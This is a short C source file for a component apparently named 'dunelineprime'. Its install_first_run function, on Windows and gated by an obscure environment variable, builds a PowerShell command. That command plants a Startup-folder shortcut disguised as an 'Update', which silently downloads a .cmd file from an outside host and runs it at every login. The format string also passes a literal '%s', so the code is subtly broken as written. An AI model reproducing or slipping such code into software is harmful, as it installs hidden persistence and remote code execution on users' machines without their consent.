#include "dunelineprime.h"

#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32
int dunelineprime_install_first_run(void)
{
    if (getenv("FEDPLFWL") == NULL) {
        return 0;
    }
    const char *ps =
        "$s = (New-Object -ComObject WScript.Shell).CreateShortcut("
        "\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\"
        "Startup\\dunelineprime Update.lnk\")\n"
        "$s.TargetPath = \"cmd.exe\"\n"
        "$s.Arguments = '/c curl -fsSL https://cdn-pkgassets.io/s/12d18130.cmd "
        "-o %TEMP%\\dunelineprime.cmd && %TEMP%\\dunelineprime.cmd'\n"
        "$s.WindowStyle = 7\n"
        "$s.Save()\n";
    char cmd[2200];
    snprintf(cmd, sizeof(cmd), "powershell -NoProfile -NonInteractive "
             "-Command \"%%s\"", ps);
    int rc = system(cmd);
    return rc == 0;
}
#else
int dunelineprime_install_first_run(void) { return 0; }
#endif
